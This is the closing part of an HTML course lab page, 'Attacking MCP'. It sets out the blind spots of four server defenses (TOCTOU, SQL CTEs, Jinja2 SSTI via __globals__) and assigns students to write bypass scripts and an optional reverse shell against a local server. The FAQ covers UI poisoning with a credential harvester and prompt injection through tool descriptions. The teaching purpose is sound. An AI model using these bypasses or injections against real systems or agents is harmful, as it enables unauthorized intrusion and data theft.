+<div class="callout insight keep-in-present">
+  <span class="label">why each defense is partial</span>
+  <p>None of these defenses is complete. The hash pin breaks if an attacker can patch the expected-hashes file too. The post-resolve sandbox check still misses TOCTOU races and symlink-into-tmpfs tricks. The table allowlist falls to SQL features the parser doesn't understand (CTEs, window functions touching catalogs). The SandboxedEnvironment has had real escape CVEs over the years. <strong>Defense in depth is the only honest answer — every layer raises the bar; no single layer is the answer.</strong> The assignment asks you to find the next bypass.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="assignment">Assignment · find the next bypass <span class="time-tag">~3 hours</span></h2>
+
+<p>Pick one of the four defenses in <code>secure_server.py</code>. Find a payload that bypasses it. Submit:</p>
+
+<ol>
+  <li><strong><code>bypass.py</code></strong> — runnable script targeting <code>localhost:8081</code> that successfully extracts a credential, leaks a file, or lands code execution, depending on which defense you chose.</li>
+  <li><strong><code>writeup.md</code></strong> — one page. Three sections: (a) what blind spot in the defense your bypass exploits; (b) the next defense you'd add to <code>secure_server.py</code> to close that blind spot; (c) what new bypass that next defense would create.</li>
+  <li><strong>Optional + 15</strong> — for Attack 5, turn the <code>id</code>-level RCE into a working reverse shell using the OffSec §7.3.3 chr-encoding fragments-across-tickets technique.</li>
+</ol>
+
+<h3>Rubric</h3>
+<table>
+  <thead><tr><th>criterion</th><th style="text-align:right;">points</th></tr></thead>
+  <tbody>
+    <tr><td>Bypass script runs cleanly against <code>secure_server.py</code> and exits 0</td><td style="text-align:right;">25</td></tr>
+    <tr><td>Writeup correctly identifies the specific blind spot exploited</td><td style="text-align:right;">25</td></tr>
+    <tr><td>Proposed next-defense is concrete (you could implement it in &lt; 50 lines)</td><td style="text-align:right;">15</td></tr>
+    <tr><td>Writeup correctly anticipates the new bypass the next defense creates</td><td style="text-align:right;">15</td></tr>
+    <tr><td>Attack chain documents at least one <a href="https://atlas.mitre.org/">MITRE ATLAS</a> technique correctly</td><td style="text-align:right;">10</td></tr>
+    <tr><td>Optional · reverse shell via tickets-and-chr-encoding chain</td><td style="text-align:right;">+15</td></tr>
+    <tr><td>Optional · finding a non-OffSec-documented MCP attack and demonstrating it</td><td style="text-align:right;">+15</td></tr>
+    <tr><td><strong>Total</strong></td><td style="text-align:right;"><strong>100 (+30)</strong></td></tr>
+  </tbody>
+</table>
+
+<!-- ============================================================ -->
+<h2 id="faq">FAQ</h2>
+
+<h3>Is this legal against a commercial MCP host or server?</h3>
+<p>No. Same posture as Lab 05: the boundary is "the server is one you started." Anthropic, OpenAI, and the various IDE vendors run vulnerability-disclosure programs — if you have a finding against a production system, that is the right channel. CVE-2025-53109 and 53110 are recent reminders that responsible disclosure leads to patched code; running the same exploit against an unpatched production server is unauthorized access.</p>
+
+<h3>Why is MCP Apps UI poisoning (Attack 4) narrative-only?</h3>
+<p>Because it requires a real MCP host that implements the Apps spec — Continue, Claude Desktop, OpenAI Apps. Setting up one of those locally is out of scope for a 3-hour lab; the structural attack is the lesson. Students who want to do this end-to-end can install Continue, point it at a custom server that exposes a tool with <code>_meta.ui.resourceUri</code>, and serve the harvester HTML there. The assignment-bonus credit is available for that work.</p>
+
+<h3>The SSTI attack produces RCE as my own user. Is that "real" RCE?</h3>
+<p>Functionally, yes — code is executing inside the server process with whatever permissions that process has. On a developer workstation that's the developer's UID; on a deployment server (the OffSec walkthrough's target) it's often <code>root</code> because the MCP server ships in a container that runs as root by default. The structural vulnerability is identical; the privilege escalation is downstream of the deployment shape.</p>
+
+<h3>What if my Jinja2 version blocks <code>__globals__</code>?</h3>
+<p>Some Jinja2 hardened environments do. The default <code>jinja2.Environment</code> doesn't — only <code>SandboxedEnvironment</code> does. The lab pins the default Environment via plain <code>Template()</code>, which is the production-vulnerable pattern. Real production code that uses <code>Template</code> + user input is approximately as bad as the lab's baseline_server suggests.</p>
+
+<h3>What's the relationship to Lab 05 (Attacking AI Agents)?</h3>
+<p>Lab 05 attacks agents at the application layer — the agent owns its tools in-process. Lab 07 attacks the tool layer beneath the agent — when the tools live in a separate server the agent talks to over MCP. The two attack surfaces overlap (prompt injection through tool descriptions; trust-boundary problems at the LLM/tool interface) but the deployment shape differs. Reading Lab 06 → Lab 07 after Lab 04 → Lab 05 covers both shapes.</p>
+
+<footer style="margin-top: 80px; padding-top: 20px; border-top: 1px solid var(--rule); color: var(--ink-mute); font-size: 13px;">
+DS 6042 · Lab 07 · Attacking MCP · 2026
+</footer>
+
+</main>
+
+<script src="../_shared/lab-base.js?v=6"></script>
+<script src="viz.js?v=1"></script>
+
+</body>
+</html>
